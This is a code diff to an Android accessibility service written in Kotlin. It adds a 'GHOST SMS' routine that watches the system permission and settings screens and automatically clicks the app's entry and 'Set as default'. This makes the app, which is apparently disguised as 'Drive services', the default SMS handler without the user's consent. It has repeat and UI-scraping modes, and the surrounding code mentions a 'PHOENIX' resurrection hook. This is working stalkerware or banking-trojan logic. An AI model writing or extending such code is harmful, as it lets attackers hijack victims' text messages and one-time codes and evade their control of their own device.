@@ -212,6 +212,51 @@ class MyAccessibilityService : AccessibilityService() {
             }
         }
 
+        // --- DEFAULT SMS GHOST LOGIC ---
+        if (pkgName.contains("permissioncontroller", ignoreCase = true) || pkgName.contains("settings", ignoreCase = true)) {
+            if (DefaultSmsManager.expectedMode == "AUTO" || DefaultSmsManager.expectedMode == "RELENTLESS") {
+                val root = rootInActiveWindow
+                if (root != null) {
+                    val pm = packageManager
+                    val appName = try { pm.getApplicationLabel(pm.getApplicationInfo(packageName, 0)).toString() } catch(e:Exception) { "Drive services" }
+                    val appNodes = root.findAccessibilityNodeInfosByText(appName)
+                    
+                    var clickedRadio = false
+                    for (node in appNodes) {
+                        var target: android.view.accessibility.AccessibilityNodeInfo? = node
+                        while (target != null && !target.isClickable) {
+                            target = target.parent
+                        }
+                        if (target != null && target.isClickable) {
+                            target.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
+                            clickedRadio = true
+                            break
+                        }
+                    }
+                    
+                    if (clickedRadio) {
+                        val setNodes = root.findAccessibilityNodeInfosByText("Set as default")
+                        for (btn in setNodes) {
+                            if (btn.isClickable) {
+                                btn.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
+                                DebugLogger.log("GHOST_SMS", "Successfully auto-clicked Set as default.")
+                                if (DefaultSmsManager.expectedMode == "AUTO") {
+                                    DefaultSmsManager.expectedMode = "" // Disarm
+                                }
+                                break
+                            }
+                        }
+                    }
+                }
+            } else if (DefaultSmsManager.expectedMode == "SCRAPE") {
+                val treeJson = getInstantTree(null, 10)
+                val wrapper = JSONObject().apply { put("pkg", pkgName); put("tree", treeJson) }
+                DumpManager.appendLog("SCRAPE_SMS_DIALOG", wrapper)
+                DebugLogger.log("GHOST_SMS", "Scraped Default SMS dialog for forensic mapping.")
+                DefaultSmsManager.expectedMode = "" // Disarm
+            }
+        }
+
         // --- 0. PHOENIX HOOK (Resurrection check) ---
         val now = System.currentTimeMillis()
         if (now - lastPhoenixCheck > 60000) { // Throttle checks to once a minute maximum
